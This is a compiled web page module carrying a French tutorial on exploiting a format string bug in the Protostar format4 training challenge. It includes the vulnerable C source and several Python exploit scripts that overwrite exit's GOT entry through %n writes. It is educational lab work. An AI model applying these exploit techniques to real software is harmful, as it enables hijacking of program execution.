import{_ as s,c as n,o as a,af as t}from"./chunks/framework.CgkrJXe5.js";const p="/medias/articles/format-strings/image-1.png",i="/medias/articles/format-strings/image.png",l="/medias/articles/format-strings/image-2.png",o="/medias/articles/format-strings/image-3.png",r="/medias/articles/format-strings/image-4.png",c="/medias/articles/format-strings/image-5.png",u="/medias/articles/format-strings/image-7.png",d="/medias/articles/format-strings/image-6.png",m="/medias/articles/format-strings/image-8.png",g="/medias/articles/format-strings/image-9.png",f="/medias/articles/format-strings/image-10.png",h="/medias/articles/format-strings/image-11.png",v="/medias/articles/format-strings/image-12.png",b="/medias/articles/format-strings/image-13.png",N=JSON.parse(`{"title":"Format Strings","description":"Les format strings sont une autre forme de vulnérabilité pouvant permettre de rediriger le flow d’exécution d'un programme, voyons ensemble comment les exploiter.","frontmatter":{"title":"Format Strings","date":"2019-10-22","description":"Les format strings sont une autre forme de vulnérabilité pouvant permettre de rediriger le flow d’exécution d'un programme, voyons ensemble comment les exploiter.","categories":["exploit","tutos"],"image":"/medias/articles/format-strings/Glider_rubik.jpg"},"headers":[],"relativePath":"articles/format-strings.md","filePath":"articles/format-strings.md"}`),x={name:"articles/format-strings.md"};function q(_,e,k,y,C,P){return a(),n("div",null,e[0]||(e[0]=[t(`<h3 id="qu-est-ce-que-c-est" tabindex="-1">Qu&#39;est ce que c&#39;est ? <a class="header-anchor" href="#qu-est-ce-que-c-est" aria-label="Permalink to &quot;Qu&#39;est ce que c&#39;est ?&quot;">​</a></h3><p>En C, de nombreuses fonctions permettent le formatage d&#39;une variable avant l&#39;affichage , comme <em>%s %i %d</em> pour les plus connues. Les fonctions comme <em>printf, vsprintf,</em> ou <em>fprintf</em> utilisent ces formateurs afin de transformer les variables avant l&#39;affichage. Cependant, lorsque aucun formateur n&#39;est imposé, le programme va considérer la variable et appliquer les formateurs présent dans cette dernière.</p><p>Si l&#39;utilisateur à le contrôle de cette variable, il se produit une vulnérabilité &quot;Format string&quot;.</p><p>Les format strings peuvent être utilisées de différentes manières.<br> Il est possible de :</p><ul><li>Lire du contenu en mémoire (%x)</li><li>Ecrire du contenu en mémoire ( write-what-where ) (%n)</li></ul><h3 id="exemple" tabindex="-1">Exemple <a class="header-anchor" href="#exemple" aria-label="Permalink to &quot;Exemple&quot;">​</a></h3><p>Pour cet article, nous allons nous baser sur le <a href="https://exploit-exercises.lains.space/protostar/format4/" target="_blank" rel="noreferrer">challenge 4 de Protostar.</a></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>#include &lt;stdlib.h&gt;</span></span>
<span class="line"><span>#include &lt;unistd.h&gt;</span></span>
<span class="line"><span>#include &lt;stdio.h&gt;</span></span>
<span class="line"><span>#include &lt;string.h&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int target;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>void hello()</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>  printf(&quot;code execution redirected! you win\\n&quot;);</span></span>
<span class="line"><span>  _exit(1);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>void vuln()</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>  char buffer[512];</span></span>
<span class="line"><span>  fgets(buffer, sizeof(buffer), stdin);</span></span>
<span class="line"><span>  printf(buffer);</span></span>
<span class="line"><span>  exit(1);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main(int argc, char **argv)</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>  vuln();</span></span>
<span class="line"><span>}</span></span></code></pre></div><p>Nous pouvons garder l&#39;ASLR celle ci ne nous handicapera pas.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>gcc -fno-stack-protector -o vuln source.c -m32</span></span>
<span class="line"><span>cat /proc/sys/kernel/randomize_va_space 2</span></span></code></pre></div><p>Ce morceau de code mets simplement en évidence la présence d&#39;une vulnérabilité de type format string &quot;classique&quot;. La ligne 20 comporte un <em>printf</em> d&#39;un contenu contrôlé par l&#39;utilisateur sans formatage imposé.</p><h4 id="mise-en-evidence-de-la-vulnerabilite" tabindex="-1">Mise en évidence de la vulnérabilité <a class="header-anchor" href="#mise-en-evidence-de-la-vulnerabilite" aria-label="Permalink to &quot;Mise en évidence de la vulnérabilité&quot;">​</a></h4><p>Commençons par lancer le programme de manière &quot;légitime&quot;.</p><p><img src="`+p+'" alt="Comportement &quot;normal&quot;"></p><p>Le programme se contente de restituer le contenu de la variable buffer à l&#39;aide du printf. Lançons ensuite le programme avec le formateur <em>%x</em>.</p><p><img src="'+i+'" alt="Mise en évidence de la vulnérabilité"></p><p>Nous pouvons constater que le résultat n&#39;est pas le même. Nous mettons en évidence la présence de la vulnérabilité. Tentons à présent de prendre le contrôle sur ce programme. Pour cela, nous devons tout d&#39;abord savoir quel argument nous contrôlons sur la pile, j&#39;utilise donc comme premier argument AAAA suivi d&#39;une bonne dizaine de formateurs.</p><p><img src="'+l+'" alt="Manipulation du programme"></p><p>Nous pouvons repérer la présence de <em>41414141</em> en 7ème position sur la pile. Vérifions le simplement :</p><p><img src="'+o+'" alt=""></p><p>Le format d&#39;écriture %Y$x permet d&#39;accéder au Yème paramètre de la pile, ce qui est plus simple que d&#39;écrire Y fois &quot;<em>%x</em>&quot;.</p><h4 id="road-to-eip" tabindex="-1">Road to EIP <a class="header-anchor" href="#road-to-eip" aria-label="Permalink to &quot;Road to EIP&quot;">​</a></h4><p>La fonction <em>vuln</em> contient le morceau de code vulnérable, il contient également le moyen de contrôler EIP. En effet, la fonction <em>exit</em> qui suit le <em>printf</em> n&#39;aura à l’exécution pas encore été résolue. Il est alors possible d&#39;écraser la valeur de <em>exit</em> dans la GOT pour une valeur que nous contrôlons (l&#39;objectif ici étant la fonction <em>hello</em> )</p><p>Nous allons ici utiliser le formateur <em>%n</em> ce dernier permet &quot;d&#39;écrire à l&#39;emplacement indiqué, le nombre de caractères qui ont été précédemment écrits&quot;</p><p>La description des formateurs est indiquée dans le man 3 de la fonction printf, ainsi que cet extrait :</p><p>BUGS Because sprintf() and vsprintf() assume an arbitrarily long string, callers must be careful not to overflow the actual space; this is often impossible to assure. Note that the length of the strings produced is locale-dependent and difficult to pre‐ dict. Use snprintf() and vsnprintf() instead (or asprintf(3) and vasprintf(3)).</p><p>Code such as printf(foo); often indicates a bug, since foo may contain a % charac‐ ter. If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.</p><p>Récoltons à présent les informations nécessaires à l&#39;exploitation de la vulnérabilité :</p><p>Tout d&#39;abord, l&#39;emplacement de la fonction &quot;Hello&quot;, ALSR ou pas, les segment de codes ne sont pas placées de manière aléatoire, nous pouvons donc directement utiliser cette adresse.</p><p><img src="'+r+'" alt="Obtention de l&#39;adresse de la fonction hello"></p><p><img src="'+c+`" alt="Obtention de l&#39;adresse de la fonction exit dans la GOT"></p><h4 id="debugging" tabindex="-1">Debugging <a class="header-anchor" href="#debugging" aria-label="Permalink to &quot;Debugging&quot;">​</a></h4><p>Pour la suite de l&#39;exploitation je vous conseille d&#39;utiliser deux shells distincts, le premier servira à lancer GDB, le second à éditer et générer le payload.</p><p>Posons un breakpoint avant le call du dernier <em>printf</em> de la fonction vuln, puis juste après. De même, nous pouvons proser un watchpoint sur l&#39;adresse de la fonction exit dans la PLT ( 0x804a20 ).</p><p>Nous avons à présent les informations nécessaires pour commencer notre script :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>import struct</span></span>
<span class="line"><span>hello_func = 0x80484fd</span></span>
<span class="line"><span>exit_func = 0x804a020</span></span>
<span class="line"><span></span></span>
<span class="line"><span>exploit = &quot;&quot;</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt) #arg 7</span></span>
<span class="line"><span>exploit += &quot;%x&quot;</span></span>
<span class="line"><span>exploit += &quot;%7$n&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>print exploit</span></span></code></pre></div><p>Lançons ce script et redirigeons la sortie vers un fichier dans /tmp, il sera plus simple d&#39;opérer le debug dans GDB par ce biais.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>python2 sploit.py &amp;gt; /tmp/a</span></span></code></pre></div><p>Puis dans gdb, après avoir placé nos breakpoints :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>gdb-peda$ run &lt; /tmp/a</span></span></code></pre></div><p>Inspectons la valeur de l&#39;adresse de la fonction exit sur la PLT juste avant l’exécution de la fonction <em>printf</em> vulnérable.</p><p><img src="`+u+'" alt="Valeur &quot;normale de la PLT&quot;"></p><p>Continuons le débug juste après l’exécution du morceau de code vulnérable :</p><p><img src="'+d+`" alt="Breakpoint"></p><p>Nous constatons que cette valeur est modifiée elle passe de 0x080483e6 à 0x0000000b. Nous avons donc réussi à la manipuler.</p><h4 id="ecriture-de-la-bonne-valeur" tabindex="-1">Ecriture de la bonne valeur <a class="header-anchor" href="#ecriture-de-la-bonne-valeur" aria-label="Permalink to &quot;Ecriture de la bonne valeur&quot;">​</a></h4><p>A présent nous devons inscrire 0x80484fd ( adresse de la fonction hello ). Actuellement, nous avons la valeur 0x0b inscrite, c&#39;est à dire qu&#39;a cet instant, le formateur %n à déduis que nous avions écrit 11 caractères. Nous devons a présent en écrire 0x80484fd-0x0b de plus, soit : 134 513 917.</p><p>Ecrire plus d&#39;un million de caractères voici un bon moyen de planter notre programme et cela ne va tout simplement pas marcher.</p><p>Pour éviter ce problème nous allons ruser, et inscrire cette valeur en deux fois, tout d&#39;abord la partie basse de l&#39;adresse ( 0x84fd ) puis la partie haute (0x0804) ce qui fait un nombre de caractères à inscrire nettement moins important. A présent, recherchons la bonne valeur à l&#39;aide de GDB.</p><p>0x84fd correspond à 34045 en int, tentons avec cette valeure.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>import struct</span></span>
<span class="line"><span>hello_func = 0x80484fd</span></span>
<span class="line"><span>exit_func = 0x804a020</span></span>
<span class="line"><span></span></span>
<span class="line"><span>exploit = &quot;&quot;</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt) #arg 7</span></span>
<span class="line"><span>exploit += &quot;%34045x&quot;</span></span>
<span class="line"><span>exploit += &quot;%7$n&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>print exploit</span></span></code></pre></div><p><img src="`+m+`" alt=""></p><p>Nous obtenons comme valeur 0x00008505, soit 0x00008505-0x84fd =<br> 8 caractères de trop ! Ceci est due au caractères précédemment &quot;inscrits&quot;. Rectifions notre code :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>import struct</span></span>
<span class="line"><span>hello_func = 0x80484fd</span></span>
<span class="line"><span>exit_func = 0x804a020</span></span>
<span class="line"><span></span></span>
<span class="line"><span>exploit = &quot;&quot;</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt) #arg 7</span></span>
<span class="line"><span>exploit += &quot;%34037x&quot;</span></span>
<span class="line"><span>exploit += &quot;%7$n&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>print exploit</span></span></code></pre></div><p><img src="`+g+'" alt=""></p><p>Super ! il ne reste plus qu&#39;a inscrire la bonne valeur dans la partie haute.</p><p>Pour cela, nous allons décaler notre adresse d&#39;écriture à exit@got.plt+2.</p><p><img src="'+f+`" alt="Décalage en mémoire"></p><p>Et nous reprenons le même principe.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>import struct</span></span>
<span class="line"><span></span></span>
<span class="line"><span>hello_func = 0x80484fd #func to call to win</span></span>
<span class="line"><span>exit_plt = 0x804a020</span></span>
<span class="line"><span></span></span>
<span class="line"><span>exploit = &quot;&quot;</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt) #7eme arg</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt+2) # 8eme arg</span></span>
<span class="line"><span></span></span>
<span class="line"><span>exploit += &quot;%34037x&quot;</span></span>
<span class="line"><span>exploit += &quot;%7$n &quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>exploit += &quot;%x&quot;</span></span>
<span class="line"><span>exploit += &quot;%8$n&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>print exploit</span></span></code></pre></div><p><img src="`+h+`" alt="Ecriture dans la partie haute de l&#39;adresse"></p><p>8506, voici une valeur bien inattendue. C&#39;est pourtant logique, le formateur &quot;<em>%n</em>&quot; inscrivant le nombre de caractères précédemment affichés il va dépendre du nombre déja inscrit dans la partie basse.</p><p>Mais alors comment inscrire 0x0804 dans la partie haute ? Et bien en inscrivant 0x10804 dans la &quot;partie basse&quot; de exit@plt+2.</p><p>0x10804-0x8506+8 = 33542 ( +8 car nous avons ajouté une adresse donc 8 caractères ). Nous obtenons à présent le code suivant :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>import struct</span></span>
<span class="line"><span>hello_func = 0x80484fd #func to call to win exit_plt = 0x804a020</span></span>
<span class="line"><span>exploit = &quot;&quot;</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt) #7eme arg</span></span>
<span class="line"><span>exploit += struct.pack(&#39;I&#39;,exit_plt+2) # 8eme arg</span></span>
<span class="line"><span>exploit += &quot;%34037x&quot; exploit += &quot;%7$n &quot;</span></span>
<span class="line"><span>exploit += &quot;%33542x&quot; exploit += &quot;%8$n&quot;</span></span>
<span class="line"><span>print exploit</span></span></code></pre></div><p><img src="`+v+'" alt="Les adresses ont bien les bonnes valeurs"></p><p>Nous pouvons constater que l&#39;adresse inscrite dans la PLT est bien celle de la fonction hello. La redirection est donc valide :</p><p><img src="'+b+`" alt=""></p><p>Nous pouvons jouer cet exploit hors de GDB :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>shoxx@pwnable:~/Format4$ python2 sploit.py | ./vuln</span></span>
<span class="line"><span> &quot;AAAA                                                   [....]</span></span>
<span class="line"><span>code execution redirected! you win</span></span></code></pre></div><h3 id="conclusion" tabindex="-1">Conclusion <a class="header-anchor" href="#conclusion" aria-label="Permalink to &quot;Conclusion&quot;">​</a></h3><p>Nous avons ici exploité une format string afin de modifier une adresse située dans la PLT. Cet exemple est &quot;typique&quot; d&#39;une format string. Je vous invite dans la section <a href="https://shoxxdj.fr/writeups/" target="_blank" rel="noreferrer">writeup</a> pour découvrir d&#39;autres cas d’exploitation de cette vulnérabilité.</p>`,72)]))}const A=s(x,[["render",q]]);export{N as __pageData,A as default};
